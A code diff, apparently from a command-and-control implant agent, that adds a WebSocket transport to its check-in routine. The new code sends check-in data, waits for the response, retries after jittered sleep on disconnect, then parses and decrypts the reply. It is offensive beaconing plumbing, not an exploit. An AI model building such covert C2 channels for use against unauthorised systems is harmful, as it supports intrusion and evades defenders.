@@ -4,6 +4,10 @@
 
 #include "TransportSmb.h"
 #include "TransportTcp.h"
+#include "TransportWebsocket.h"
+#include "Package.h"
+#include "Parser.h"
+#include "Sleep.h"
 
 #include <lm.h>
 #include <lmwksta.h>
@@ -300,6 +304,43 @@ BOOL CheckinSend()
     }
 
     ParserNew(&Output, pOutData, OutLen);
+
+    ParserDecrypt(&Output);
+
+#endif
+
+#ifdef WEBSOCKET_TRANSPORT
+
+    PBYTE  pOutData = NULL;
+    SIZE_T OutLen   = 0;
+
+    PackageSend(CheckinData, NULL);
+
+    _dbg("[WS] Waiting for checkin response...");
+
+    while ( pOutData == NULL || OutLen == 0 )
+    {
+        if ( !WebsocketIsConnected() )
+        {
+            _err("[WS] Disconnected while waiting for checkin");
+            SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
+            PackageSend(CheckinData, NULL);
+            continue;
+        }
+
+        WebsocketWaitInbound(5000);
+
+        if ( WebsocketReceive(&pOutData, &OutLen) )
+            break;
+    }
+
+    ParserNew(&Output, pOutData, OutLen);
+
+    if ( pOutData )
+    {
+        LocalFree(pOutData);
+        pOutData = NULL;
+    }
 
     ParserDecrypt(&Output);
 
